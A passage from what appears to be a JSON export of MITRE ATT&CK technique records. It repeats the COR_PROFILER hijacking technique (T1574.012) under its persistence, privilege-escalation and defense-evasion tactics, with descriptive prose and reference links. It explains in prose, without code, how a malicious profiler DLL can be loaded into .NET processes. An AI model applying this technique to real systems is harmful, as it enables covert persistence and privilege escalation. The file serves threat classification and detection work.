Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",
    "technique_references": [
      {
        "source_name": "Microsoft Profiling Mar 2017",
        "url": "https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview",
        "description": "Microsoft. (2017, March 30). Profiling Overview. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COR_PROFILER Feb 2013",
        "url": "https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)",
        "description": "Microsoft. (2013, February 4). Registry-Free Profiler Startup and Attach. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "RedCanary Mockingbird May 2020",
        "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
        "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Red Canary COR_PROFILER May 2020",
        "url": "https://redcanary.com/blog/cor_profiler-for-persistence/",
        "description": "Brown, J. (2020, May 7). Detecting COR_PROFILER manipulation for persistence. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Almond COR_PROFILER Apr 2019",
        "url": "https://offsec.almond.consulting/UAC-bypass-dotnet.html",
        "description": "Almond. (2019, April 30). UAC bypass via elevated .NET applications. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub OmerYa Invisi-Shell",
        "url": "https://github.com/OmerYa/Invisi-Shell",
        "description": "Yair, O. (2019, August 19). Invisi-Shell. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "subTee .NET Profilers May 2017",
        "url": "https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html",
        "description": "Smith, C. (2017, May 18). Subvert CLR Process Listing With .NET Profilers. Retrieved June 24, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335",
    "platform": "windows",
    "tid": "T1574.012",
    "technique": "COR_PROFILER",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",
    "technique_references": [
      {
        "source_name": "Microsoft Profiling Mar 2017",
        "url": "https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview",
        "description": "Microsoft. (2017, March 30). Profiling Overview. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COR_PROFILER Feb 2013",
        "url": "https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)",
        "description": "Microsoft. (2013, February 4). Registry-Free Profiler Startup and Attach. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "RedCanary Mockingbird May 2020",
        "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
        "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Red Canary COR_PROFILER May 2020",
        "url": "https://redcanary.com/blog/cor_profiler-for-persistence/",
        "description": "Brown, J. (2020, May 7). Detecting COR_PROFILER manipulation for persistence. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Almond COR_PROFILER Apr 2019",
        "url": "https://offsec.almond.consulting/UAC-bypass-dotnet.html",
        "description": "Almond. (2019, April 30). UAC bypass via elevated .NET applications. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub OmerYa Invisi-Shell",
        "url": "https://github.com/OmerYa/Invisi-Shell",
        "description": "Yair, O. (2019, August 19). Invisi-Shell. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "subTee .NET Profilers May 2017",
        "url": "https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html",
        "description": "Smith, C. (2017, May 18). Subvert CLR Process Listing With .NET Profilers. Retrieved June 24, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335",
    "platform": "windows",
    "tid": "T1574.012",
    "technique": "COR_PROFILER",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",
    "technique_references": [
      {
        "source_name": "Microsoft Profiling Mar 2017",
        "url": "https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview",
        "description": "Microsoft. (2017, March 30). Profiling Overview. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COR_PROFILER Feb 2013",
        "url": "https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)",
        "description": "Microsoft. (2013, February 4). Registry-Free Profiler Startup and Attach. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "RedCanary Mockingbird May 2020",
        "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
        "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Red Canary COR_PROFILER May 2020",
        "url": "https://redcanary.com/blog/cor_profiler-for-persistence/",
        "description": "Brown, J. (2020, May 7). Detecting COR_PROFILER manipulation for persistence. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Almond COR_PROFILER Apr 2019",
        "url": "https://offsec.almond.consulting/UAC-bypass-dotnet.html",
        "description": "Almond. (2019, April 30). UAC bypass via elevated .NET applications. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub OmerYa Invisi-Shell",
        "url": "https://github.com/OmerYa/Invisi-Shell",
        "description": "Yair, O. (2019, August 19). Invisi-Shell. Retrieved June 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "subTee .NET Profilers May 2017",
        "url": "https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html",
        "description": "Smith, C. (2017, May 18). Subvert CLR Process Listing With .NET Profilers. Retrieved June 24, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  }
]
